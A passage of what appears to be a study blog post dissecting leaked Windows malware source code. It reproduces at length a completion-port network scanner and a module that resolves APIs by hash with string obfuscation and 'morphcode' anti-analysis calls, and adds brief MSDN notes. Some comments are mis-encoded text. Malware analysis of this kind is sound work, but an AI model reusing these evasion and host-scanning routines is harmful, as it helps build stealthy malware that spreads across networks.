<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">				pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">				pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">				TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">				pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>CompletionStatus </p>
<ul>
<li>A pointer to a variable that receives the completion key value associated with the file handle whose I&#x2F;O operation has completed. A completion key is a per-file key that is specified in a call to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/FileIO/createiocompletionport">CreateIoCompletionPort</a>.<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
</ul>
</li>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">PortScanHandler</span><span class="params">(PVOID pArg)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	HANDLE hTimer = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hTimerQueue = pCreateTimerQueue();</span><br><span class="line">	<span class="keyword">if</span> (!hTimerQueue) &#123;</span><br><span class="line">		pExitThread(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesTransferred;</span><br><span class="line">		ULONG_PTR CompletionStatus;</span><br><span class="line">		PCONNECT_CONTEXT ConnectContext;</span><br><span class="line"></span><br><span class="line">		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CompletionStatus == START_COMPLETION_KEY) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == CONNECT_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations--;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = CONNECTED;</span><br><span class="line">				AddHost(ConnectContext-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDeleteTimerQueue(hTimerQueue);</span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/_fs/">MSDN</a></p>
<p>[Critical Section in Synchronization](</p>
<h2 id="api"><a href="#api" class="headerlink" title="api"></a>api</h2><h3 id="getapi"><a href="#getapi" class="headerlink" title="getapi"></a>getapi</h3><blockquote>
<p>#define KERNEL32DLL_HASH 0xb26771d8</p>
<p>#define LOADLIBRARYA_HASH 0x439c7e33</p>
</blockquote>
<p><strong>getapi::IsRestartManagerLoaded</strong>，<strong>getapi::SetRestartManagerLoaded</strong> function is used to KillFileOwner function.It will check if Rstrtmgr.dll is loaded.</p>
<p>self-realize function such as <strong>my_stoi、FindChar、m_memcpy、StrLen</strong></p>
<h4 id="getapi-InitializeGetapiModule"><a href="#getapi-InitializeGetapiModule" class="headerlink" title="getapi::InitializeGetapiModule"></a>getapi::InitializeGetapiModule</h4><p>first generate the function <code>LoadlibraryA</code></p>
<ul>
<li>GetKernel32</li>
<li>GetApiAddr</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">getapi::InitializeGetapiModule()</span><br><span class="line">&#123;</span><br><span class="line">	g_hKernel32 = GetKernel32();</span><br><span class="line">	morphcode(g_hKernel32);</span><br><span class="line"></span><br><span class="line">	ADDR dwLoadLibraryA;</span><br><span class="line">	pLoadLibraryA = (fnLoadLibraryA)GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &amp;dwLoadLibraryA);</span><br><span class="line"></span><br><span class="line">	morphcode(pLoadLibraryA);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pLoadLibraryA) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_ApiCache = (LPVOID*)<span class="built_in">malloc</span>(API_CACHE_SIZE);</span><br><span class="line"></span><br><span class="line">	morphcode(g_ApiCache);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!g_ApiCache) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(g_ApiCache, API_CACHE_SIZE);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getapi-GetProcAddressEx"><a href="#getapi-GetProcAddressEx" class="headerlink" title="getapi::GetProcAddressEx"></a>getapi::GetProcAddressEx</h4><p>GetProcAddress by the ModuleName or the ModuleId follow.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">MODULES</span> &#123;</span></span><br><span class="line">	KERNEL32_MODULE_ID = <span class="number">15</span>,</span><br><span class="line">	ADVAPI32_MODULE_ID,</span><br><span class="line">	NETAPI32_MODULE_ID,</span><br><span class="line">	IPHLPAPI_MODULE_ID,</span><br><span class="line">	RSTRTMGR_MODULE_ID,</span><br><span class="line">	USER32_MODULE_ID,</span><br><span class="line">	WS2_32_MODULE_ID,</span><br><span class="line">	SHLWAPI_MODULE_ID,</span><br><span class="line">	SHELL32_MODULE_ID,</span><br><span class="line">	OLE32_MODULE_ID,</span><br><span class="line">	OLEAUT32_MODULE_ID,</span><br><span class="line">	NTDLL_MODULE_ID</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>pLoadLibraryA</li>
<li>GetApiAddr get the api function address by the Hash argument</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">LPVOID</span><br><span class="line"><span class="title function_">getapi::GetProcAddressEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPCSTR ModuleName, </span></span><br><span class="line"><span class="params">	__in DWORD ModuleId,</span></span><br><span class="line"><span class="params">	__in DWORD Hash</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">	ADDR ProcAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	LPCSTR Advapi32DLL = OBFA(<span class="string">&quot;Advapi32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Kernel32DLL = OBFA(<span class="string">&quot;Kernel32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Netapi32DLL = OBFA(<span class="string">&quot;Netapi32.dll&quot;</span>);</span><br><span class="line">	LPCSTR IphlpapiDLL = OBFA(<span class="string">&quot;Iphlpapi.dll&quot;</span>);</span><br><span class="line">	LPCSTR RstrtmgrDLL = OBFA(<span class="string">&quot;Rstrtmgr.dll&quot;</span>);</span><br><span class="line">	LPCSTR Ws2_32DLL = OBFA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line">	LPCSTR User32DLL = OBFA(<span class="string">&quot;User32.dll&quot;</span>);</span><br><span class="line">	LPCSTR ShlwapiDLL = OBFA(<span class="string">&quot;Shlwapi.dll&quot;</span>);</span><br><span class="line">	LPCSTR Shell32DLL = OBFA(<span class="string">&quot;Shell32.dll&quot;</span>);</span><br><span class="line">	LPCSTR Ole32DLL = OBFA(<span class="string">&quot;Ole32.dll&quot;</span>);</span><br><span class="line">	LPCSTR OleAut32DLL = OBFA(<span class="string">&quot;OleAut32.dll&quot;</span>);</span><br><span class="line">	LPCSTR NtdllDLL = OBFA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ModuleName)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode((<span class="type">char</span>*)ModuleName);</span><br><span class="line"></span><br><span class="line">		hModule = pLoadLibraryA(ModuleName);</span><br><span class="line"></span><br><span class="line">		morphcode(hModule);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line"></span><br><span class="line">			ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress);</span><br><span class="line"></span><br><span class="line">			morphcode(ProcAddress);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> (LPVOID)ProcAddress;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (ModuleId)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> KERNEL32_MODULE_ID:</span><br><span class="line">			ModuleName = Kernel32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> ADVAPI32_MODULE_ID:</span><br><span class="line">			ModuleName = Advapi32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> NETAPI32_MODULE_ID:</span><br><span class="line">			ModuleName = Netapi32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> IPHLPAPI_MODULE_ID:</span><br><span class="line">			ModuleName = IphlpapiDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> RSTRTMGR_MODULE_ID:</span><br><span class="line">			ModuleName = RstrtmgrDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> USER32_MODULE_ID:</span><br><span class="line">			ModuleName = User32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> WS2_32_MODULE_ID:</span><br><span class="line">			ModuleName = Ws2_32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> SHLWAPI_MODULE_ID:</span><br><span class="line">			ModuleName = ShlwapiDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> SHELL32_MODULE_ID:</span><br><span class="line">			ModuleName = Shell32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> OLE32_MODULE_ID:</span><br><span class="line">			ModuleName = Ole32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> OLEAUT32_MODULE_ID:</span><br><span class="line">			ModuleName = OleAut32DLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> NTDLL_MODULE_ID:</span><br><span class="line">			ModuleName = NtdllDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hModule = pLoadLibraryA(ModuleName);</span><br><span class="line"></span><br><span class="line">		morphcode(hModule);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line"></span><br><span class="line">			ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress);</span><br><span class="line"></span><br><span class="line">			morphcode(ProcAddress);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> (LPVOID)ProcAddress;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (LPVOID)<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="getapi-GetProcAddressEx2"><a href="#getapi-GetProcAddressEx2" class="headerlink" title="getapi::GetProcAddressEx2"></a>getapi::GetProcAddressEx2</h4><p>get the api function address by Hash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(<span class="literal">NULL</span>, KERNEL32_MODULE_ID, <span class="number">0x1cae2a52</span>, <span class="number">109</span>);<span class="comment">//GetProcAddress(hKernel32, OBFA(&quot;CancelIo&quot;));</span></span><br></pre></td></tr></table></figure>

<p>the ApiCache is to forbid call GetProcAddressEx twice for the same function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LPVOID </span><br><span class="line"><span class="title function_">getapi::GetProcAddressEx2</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPSTR Dll, </span></span><br><span class="line"><span class="params">	__in DWORD ModuleId, </span></span><br><span class="line"><span class="params">	__in DWORD Hash, </span></span><br><span class="line"><span class="params">	__in <span class="type">int</span> CacheIndex</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?桉镱朦珞 挲?</span></span><br><span class="line">	LPVOID Addr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	Addr = g_ApiCache[CacheIndex];</span><br><span class="line">	morphcode(Addr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!Addr) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 泽黻鲨?礤??挲. 项塍鬣屐 甯 噤疱??漕徉怆屐 ?挲?</span></span><br><span class="line">		Addr = GetProcAddressEx(Dll, ModuleId, Hash);</span><br><span class="line"></span><br><span class="line">		morphcode(Addr);</span><br><span class="line"></span><br><span class="line">		g_ApiCache[CacheIndex] = Addr;</span><br><span class="line"></span><br><span class="line">	